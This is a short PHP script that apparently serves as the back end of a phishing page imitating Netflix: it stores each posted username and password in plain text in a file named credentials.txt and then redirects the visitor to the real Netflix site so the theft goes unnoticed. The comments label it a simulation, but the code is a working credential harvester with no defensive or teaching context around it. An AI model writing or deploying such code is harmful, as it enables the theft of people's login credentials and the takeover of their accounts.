<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = htmlspecialchars($_POST['username']);
    $password = htmlspecialchars($_POST['password']);
    
    // For simulation: Log to a file
    file_put_contents("credentials.txt", "User: $username | Pass: $password\n", FILE_APPEND);
    
    // Simulate redirection
    header("Location: https://www.netflix.com");
    exit();
}
?>
